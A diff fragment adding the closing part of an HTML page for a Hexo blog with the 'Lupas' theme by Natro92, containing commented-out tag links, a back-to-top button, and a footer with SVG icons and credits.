+    <!--            <a href="/tags/Tampermonkey/">-->
+    <!--                Tampermonkey-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--</ul>-->
+</div>
+<!--返回顶部按钮-->
+<button class="backToTopBtn btn" title="返回顶部">&#8593;</button>
+<!--加个渐变，但还是有点丑-->
+<!-- TODO 换个更好的方案-->
+<div class="h-1 bg-gradient-to-t from-base-content to-base-100">
+</div>
+
+<footer class="footer p-10 bg-neutral text-neutral-content">
+    <aside>
+        <svg width="50" height="50" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill-rule="evenodd" clip-rule="evenodd" class="fill-current mt-3"><path d="M22.672 15.226l-2.432.811.841 2.515c.33 1.019-.209 2.127-1.23 2.456-1.15.325-2.148-.321-2.463-1.226l-.84-2.518-5.013 1.677.84 2.517c.391 1.203-.434 2.542-1.831 2.542-.88 0-1.601-.564-1.86-1.314l-.842-2.516-2.431.809c-1.135.328-2.145-.317-2.463-1.229-.329-1.018.211-2.127 1.231-2.456l2.432-.809-1.621-4.823-2.432.808c-1.355.384-2.558-.59-2.558-1.839 0-.817.509-1.582 1.327-1.846l2.433-.809-.842-2.515c-.33-1.02.211-2.129 1.232-2.458 1.02-.329 2.13.209 2.461 1.229l.842 2.515 5.011-1.677-.839-2.517c-.403-1.238.484-2.553 1.843-2.553.819 0 1.585.509 1.85 1.326l.841 2.517 2.431-.81c1.02-.33 2.131.211 2.461 1.229.332 1.018-.21 2.126-1.23 2.456l-2.433.809 1.622 4.823 2.433-.809c1.242-.401 2.557.484 2.557 1.838 0 .819-.51 1.583-1.328 1.847m-8.992-6.428l-5.01 1.675 1.619 4.828 5.011-1.674-1.62-4.829z"></path></svg>
+        © 2020-2024 Lupas by Natro92
+        <pre class="whitespace-pre-line">框架 <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/">Hexo</a> | 主题 <a target="_blank" rel="noopener" href="https://www.example.com">Lupas</a></pre>
+    </aside>
+    <nav>
+        <header class="footer-title">Social</header>
+        <!--<div class="grid grid-flow-col gap-4">-->
+        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z"></path></svg></a>-->
+        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm-10.615 12.816v-8l8 3.993-8 4.007z"></path></svg></a>-->
+        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M9 8h-3v4h3v12h5v-12h3.642l.358-4h-4v-1.667c0-.955.192-1.333 1.115-1.333h2.885v-5h-3.808c-3.596 0-5.192 1.583-5.192 4.615v3.385z"></path></svg></a>-->
+        <!--</div>-->
+    </nav>
+</footer>
+</body>
+
+</html>
+
+
